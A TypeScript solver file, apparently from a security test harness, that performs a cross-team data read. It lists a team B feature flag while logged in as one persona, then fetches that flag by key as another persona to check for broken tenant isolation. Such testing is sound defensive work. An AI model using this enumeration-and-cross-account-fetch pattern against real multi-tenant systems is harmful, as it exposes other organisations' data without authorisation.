// Cross-team read via the feature-flag lookup: discover a team B flag key as persona_b (preferring one
// whose value carries scoped config), then resolve it by key as persona_a to read team B's value.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const listRes = await ctx.fetch(ctx.plan.routes.flagList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ flag_key: string; value: string }> }
  const items = list.items ?? []
  const victim = items.find((f) => /rbc_/.test(String(f.value))) ?? items[0]
  if (!victim) return

  await ctx.login('persona_a')
  const path = ctx.plan.routes.flagGet!.path.replace(/:[A-Za-z0-9_]+/, encodeURIComponent(victim.flag_key))
  await ctx.fetch(path, { method: 'GET' })
}
